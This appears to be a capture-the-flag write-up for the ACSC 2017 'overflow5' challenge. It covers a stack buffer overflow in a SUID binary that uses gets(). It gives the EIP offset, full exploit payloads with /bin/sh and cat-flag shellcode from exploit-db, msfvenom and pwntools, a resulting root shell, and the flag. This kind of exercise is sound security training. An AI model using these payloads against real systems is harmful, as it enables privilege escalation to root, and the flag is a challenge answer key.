@@ -1,0 +1,96 @@
+# Lets look around
+ls -lart
+
+# Ok, so the flag is root readable, but overflow5 is a SUID binary
+cat overflow5.c
+# gets() will take any length input, buffer overflow
+
+# How secure is the binary?
+./checksec.sh --file overflow5
+# Not secure at all, awesome
+
+# ASLR?
+cat /proc/sys/kernel/randomize_va_space
+# Nope! We can do a simple bufferoverflow and execute on the stack, lets rock 
+
+# First, run with a bunch of A's, see a crash
+python -c "print 'A'*300" > a
+./overflow5 < a 
+dmesg
+# segfault at 41414141 ip 0000000041414141
+
+# Pattern create to find the bytes that will be EIP
+./pattern create 300 > a
+gdb ./overflow5
+# Run with the pattern
+r < a
+# 0x41396941 in ?? ()
+
+# Find the offset
+./pattern offset 0x41396941
+# 267
+
+# Ok, so 267 bytes to overwrite EIP. Let's test
+python -c 'print "A"*267 + "\xef\xbe\xad\xde" + "C"*300' > a
+gdb ./overflow5
+r < a
+# 0xdeadbeef in ?? ()
+
+# Sweet, so we control EIP now, and the stack is executable. 
+# How much space do we have? Lets examine (x) the next 10 strings (10s) on the stack ($esp)
+x/10s $esp 
+# 0xffffd800:	'C' <repeats 200 times>...
+
+# Ok, so we have at least 300 bytes to work with, that is plenty, and we have the address to jump into
+# However, that address (0xffffd800) ends in a null byte which will end the input of gets(), so lets go a few bytes farther and pad our shellcode
+0xffffd800 + 45 = 0xffffd82d
+# This will be the address we jump to, and where we will put the start of our shellcode
+
+# Time to get some shellcode and get that flag
+# Lots of different ways to go where, for a full shell, you'll have to reopen stdin (gets is strange)
+# Shellcode from: https://www.exploit-db.com/exploits/13357/
+# format: 267 A's to overflow + address of shellcode (EIP) + 45 bytes of junk + shellcode
+python -c 'print "A"*267 + "\x2d\xd8\xff\xff" + "C"*45 +  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' > a
+./overflow5 < a
+sh-4.3# id
+uid=0(root) gid=1000(user) groups=1000(user)
+sh-4.3# cat flag
+acsc2017{every_day_im_overflowin}
+
+# Or, we could just cat the flag
+# msfvenom -p linux/x86/exec CMD="/bin/cat flag" -f py -b '\x00'
+# this shellcode is length 76
+buf =  ""
+buf += "\xdb\xdb\xbe\x70\x3d\xf1\x1c\xd9\x74\x24\xf4\x5d\x29"
+buf += "\xc9\xb1\x0d\x31\x75\x18\x03\x75\x18\x83\xc5\x74\xdf"
+buf += "\x04\x76\x7f\x47\x7e\xd5\x19\x1f\xad\xb9\x6c\x38\xc5"
+buf += "\x12\x1d\xaf\x16\x05\xce\x4d\x7e\xbb\x99\x71\xd2\xab"
+buf += "\x97\x75\xd3\x2b\x88\x17\xba\x45\xf9\xb4\x5d\xee\x25"
+buf += "\x5d\xf2\x6f\x42\xa1\x5d\x23\x05\x40\xac\x43"
+
+python -c 'print "A"*267 + "\x2d\xd8\xff\xff" + "C"*45 + "\xdb\xdb\xbe\x70\x3d\xf1\x1c\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0d\x31\x75\x18\x03\x75\x18\x83\xc5\x74\xdf\x04\x76\x7f\x47\x7e\xd5\x19\x1f\xad\xb9\x6c\x38\xc5\x12\x1d\xaf\x16\x05\xce\x4d\x7e\xbb\x99\x71\xd2\xab\x97\x75\xd3\x2b\x88\x17\xba\x45\xf9\xb4\x5d\xee\x25\x5d\xf2\x6f\x42\xa1\x5d\x23\x05\x40\xac\x43"' > a
+./overflow5 < a
+acsc2017{every_day_im_overflowin}
+
+
+# shareef12 solutions
+
+## /bin/sh payload (have to ensure our initial input doesn't send an EOF)
+user@reversing:~/acsc-2017$ python -c "from pwn import *; print asm(shellcraft.i386.linux.sh().encode('hex')"
+6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
+
+user@2e00c341085f:~$ (python -c "print 'a'*267 + '\x20\xd8\xff\xff' + '\x90'*256 + '6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80'.decode('hex')" && cat) | ./overflow5
+Enter your name: Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������jhh///sh/bin��h
+...
+...
+...
+ls
+checksec.sh  flag  overflow5  overflow5.c  pattern
+cat flag
+acsc2017{every_day_im_overflowin}
+
+## cat flag payload
+user@reversing:~/acsc-2017$ python -c "from pwn import *; print asm(shellcraft.i386.linux.cat('flag')).encode('hex')"
+6a01fe0c2468666c616789e331c931d26a0558cd806a015b89c131d268ffffff7f5e31c0b0bbcd80
+
+user@5f5e38e316f5:~$ python -c "print 'a'*267 + '\x20\xd8\xff\xff' + '\x90'*256 + '6a01fe0c2468666c616789e331c931d26a0558cd806a015b89c131d268ffffff7f5e31c0b0bbcd80'.decode('hex')" | ./overflow5
